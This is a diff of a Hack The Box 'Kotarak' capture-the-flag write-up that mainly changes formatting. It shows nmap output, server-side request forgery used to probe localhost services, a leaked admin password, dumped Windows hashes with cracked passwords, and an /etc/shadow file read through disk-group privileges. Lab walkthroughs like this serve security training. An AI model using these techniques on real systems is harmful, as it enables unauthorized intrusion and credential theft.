@@ -1,12 +1,12 @@
 Title: HTB Kotarak writeup
-Tags: oscp, htb
+Tags: oscp, htb, wget, custom enum
 Summary: Kind of convoluted or CTF-ey box
 Date: 2020-09-24 21:30
 Status: published
 
 # Enumeration
 Starting with full TCP range scan as always here:
-<pre>
+```text
     Nmap 7.80 scan initiated Thu Sep 24 11:05:54 2020 as: nmap -sS -p- -oA enum/nmap-ss-all kotarak.htb
     Nmap scan report for kotarak.htb (10.10.10.55)
     Host is up (0.059s latency).
@@ -17,10 +17,10 @@ Starting with full TCP range scan as always here:
     8080/tcp  open  http-proxy
     60000/tcp open  unknown
     Nmap done at Thu Sep 24 11:06:40 2020 -- 1 IP address (1 host up) scanned in 49.18 seconds
-</pre>
+```
 
 Continue with scripted scan:
-<pre>
+```text
     Nmap 7.80 scan initiated Thu Sep 24 11:08:45 2020 as: nmap -sC -A -T4 -p22,8009,8080,60000 -oA enum/nmap-sCAT4-open kotarak.htb
     Nmap scan report for kotarak.htb (10.10.10.55)
     Host is up (0.058s latency).
@@ -54,7 +54,7 @@ Continue with scripted scan:
     2   57.38 ms kotarak.htb (10.10.10.55)
     OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
     Nmap done at Thu Sep 24 11:09:43 2020 -- 1 IP address (1 host up) scanned in 57.80 seconds
-</pre>
+```
 Something unusual hosted on TCP 60000:
 
 ![kotarak web app 60000](/cstatic/htb-kotarak/kotarak-60000-web.png)
@@ -75,7 +75,7 @@ done
 ```
 
 Some local services discovered:
-<pre>
+```text
 TCP 22  LEN = 62
 TCP 90  LEN = 156
 TCP 110 LEN = 187
@@ -84,25 +84,25 @@ TCP 320 LEN = 1232
 TCP 888 LEN = 3955
 TCP 3306 LEN = 123
 TCP 8080 LEN = 994
-</pre>
+```
 
 Since app on 60000 likely respond with HTTP 200 on any request, I tried to enumerate services filtering responses by the length. Below are some results.
 `127.0.0.1:90`:
-<pre>
+```text
     /lost+found (Status: 200) [Size: 303]
     /server-status (Status: 200) [Size: 8679]
-</pre>
+```
 Server status available:
 
 ![server-status at TCP 90](/cstatic/htb-kotarak/90-server-status.png)
 
 The same for services on 110, 200, 320. 
 Slightly different picture at 888:
-<pre>
+```text
     /inc (Status: 200) [Size: 311]
     /lost+found (Status: 200) [Size: 304]
     /server-status (Status: 200) [Size: 8779]
-</pre>
+```
 Something interesting is here, we are able to list some files
 through this and there are some credentials (`admin:3@g01PdhB!`) in `http://10.10.10.55:60000/url.php?path=127.0.0.1:888/?doc=backup`:
 
@@ -126,7 +126,7 @@ domain controller, these files looks like dumped from somewhere else. Impacket's
 
 Notice that there are hashes for `atanas` user, user with the same name present
 on the kotarak box. Worth trying to crack these hashes:
-<pre>
+```text
     Administrator:500:aad3b435b51404eeaad3b435b51404ee:e64fe0f24ba2489c05e64354d74ebd11:::
     Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
     WIN-3G2B0H151AC$:1000:aad3b435b51404eeaad3b435b51404ee:668d49ebfdb70aeee8bcaeac9e3e66fd:::
@@ -166,13 +166,13 @@ on the kotarak box. Worth trying to crack these hashes:
     atanas:aes256-cts-hmac-sha1-96:933a05beca1abd1a1a47d70b23122c55de2fedfc855d94d543152239dd840ce2
     atanas:aes128-cts-hmac-sha1-96:d1db0c62335c9ae2508ee1d23d6efca4
     atanas:des-cbc-md5:6b80e391f113542a
-</pre>
+```
 
 crackstation.net was able to crack some hashes:
-<pre>
+```text
 e64fe0f24ba2489c05e64354d74ebd11    NTLM    f16tomcat!
 2b576acbe6bcfda7294d6bd18041b8fe    NTLM    Password123!
-</pre>
+```
 
 And `f16tomcat!` worked for `atanas` user:
 
@@ -181,7 +181,7 @@ And `f16tomcat!` worked for `atanas` user:
 # Privilege escalation
 User atanas is in `disk` group and hence could read any file on the system, for example
 here's the `/etc/shadow`:
-<pre>
+```text
     root:$6$drWeP5N5$k65A2JoUsMISRA04wVOoXFOJVU.k7qxgBrvOD23S4mo6/aRlbnJbUNhvxiXdOe6rdyuvnkZY1po.Ym3q6uYhL0:17368:0:99999:7:::
     daemon:*:17001:0:99999:7:::
     bin:*:17001:0:99999:7:::
@@ -215,7 +215,7 @@ here's the `/etc/shadow`:
     mysql:!:17359:0:99999:7:::
     lxc-dnsmasq:!:17366:0:99999:7:::
     sshd:*:17368:0:99999:7:::
-</pre>
+```
 Unfortunately it seems that we couldn't write authorized SSH keys for root.
 There's an interesting `app.log` file under `/root`:
 
